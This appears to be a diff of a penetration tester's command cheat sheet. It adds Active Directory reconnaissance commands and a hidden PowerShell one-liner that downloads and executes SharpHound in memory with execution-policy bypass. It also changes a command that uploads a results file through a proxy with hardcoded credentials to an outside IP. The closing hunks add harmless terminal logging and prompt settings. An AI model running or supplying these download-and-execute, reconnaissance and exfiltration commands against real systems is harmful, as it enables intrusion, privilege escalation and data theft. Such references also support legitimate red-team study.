 PS > powershell.exe -nop -exec bypass -c "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks |Out-File PowerUp.txt}"
 PS > powershell.exe -nop -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File Sherlock.txt}"
+
+PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
+
+PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.ps1');Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn"
 ```
 
 
@@ -2815,7 +2870,7 @@ $proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\In
 Powershell manually set proxy and upload file to remote HTTP server:
 
 ```
-$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.example.local:3128",$true);$creds=New-Object Net.NetworkCredential('snovvcrash','Passw0rd1!','example.local');$creds=$creds.GetCredential("http://proxy.example.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
+$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential('snovvcrash','Passw0rd!','megacorp.local');$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
 ```
 
 
@@ -3821,14 +3876,45 @@ $ sudo fail2ban-client unban --all
 
 
 
-### tmux
+### Console Logging
 
 
-#### tmux-logging
+#### script
+
+```
+$ script script-$(date "+%FT%H%M%S").log
+```
+
+
+#### tmux
+
+* [github.com/tmux-plugins/tmux-logging](https://github.com/tmux-plugins/tmux-logging)
 
 ```
 bash ~/.tmux/plugins/tmux-logging/scripts/screen_capture.sh
 bash ~/.tmux/plugins/tmux-logging/scripts/save_complete_history.sh
+```
+
+
+#### Time in Prompt
+
+##### bash
+
+```
+$ cat .bashrc | grep -e PS1
+PS1='${debian_chroot:+($debian_chroot)}[\D{%d}|\D{%k:%M}] \[\033[01;31m\]➜  \[\033[00m\]\[\033[01;34m\]\w\[\033[00m\] '
+PS1='${debian_chroot:+($debian_chroot)[\D{%d}|\D{%k:%M}]} ➜  \w '
+PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
+```
+
+##### zsh
+
+`$ZSH_CUSTOM/themes/robbyrussell.zsh-theme`
+
+```
+PROMPT="[%D{%d}|%D{%k:%M}] "
+PROMPT+="%(?:%{$fg_bold[green]%}➜ :%{$fg_bold[red]%}➜ ) "
+PROMPT+='%{$fg[cyan]%}%(4~|%-1~/…/%2~|%3~)%{$reset_color%} $(git_prompt_info)'
 ```
 
 
